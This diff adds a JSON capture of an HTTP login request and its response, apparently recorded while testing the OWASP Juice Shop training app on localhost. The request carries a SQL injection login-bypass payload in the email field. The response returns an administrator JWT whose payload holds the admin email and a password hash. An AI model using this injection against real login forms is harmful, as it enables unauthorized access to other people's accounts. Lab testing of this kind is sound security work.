@@ -1,0 +1,34 @@
+{
+  "request": {
+    "method": "POST",
+    "url": "http://localhost:3000/rest/user/login",
+    "headers": {
+      "sec-ch-ua-platform": "\"Linux\"",
+      "referer": "http://localhost:3000/",
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0.0.0 Safari/537.36",
+      "accept": "application/json, text/plain, */*",
+      "sec-ch-ua": "\"Chromium\";v=\"141\", \"Not?A_Brand\";v=\"8\"",
+      "content-type": "application/json",
+      "sec-ch-ua-mobile": "?0"
+    },
+    "postData": "{\"email\":\"' OR 1=1--\",\"password\":\"cualquiercosa\"}"
+  },
+  "response": {
+    "status": 200,
+    "headers": {
+      "etag": "W/\"310-j5OlMv0kcBLt05sXmWHEJys3Xn4\"",
+      "connection": "keep-alive",
+      "x-content-type-options": "nosniff",
+      "x-recruiting": "/#/jobs",
+      "access-control-allow-origin": "*",
+      "content-length": "784",
+      "keep-alive": "timeout=5",
+      "date": "Sat, 17 Oct 2026 03:42:15 GMT",
+      "content-type": "application/json; charset=utf-8",
+      "feature-policy": "payment 'self'",
+      "vary": "Accept-Encoding",
+      "x-frame-options": "SAMEORIGIN"
+    },
+    "body": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0xMC0xNyAwMzo0MTowNy4zNDEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0xMC0xNyAwMzo0MTowNy4zNDEgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3OTIyMDg1MzZ9.GjrQLYdJy0JnId_sE7xf3Ju7f36r7oGMJszkc5KoUlwXjWpNC4sDLqjN6cyLwkhE423cO3O1Tevrd7ZE7Y5U0eA9I9w3RdGu9zljwDubi614u45OpLMfhF-qcih7n6n-M8TIEa1hj1YHg-gn-5zUyBx08JSxxzpTaLk4QHL2wGc\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+  }
+}
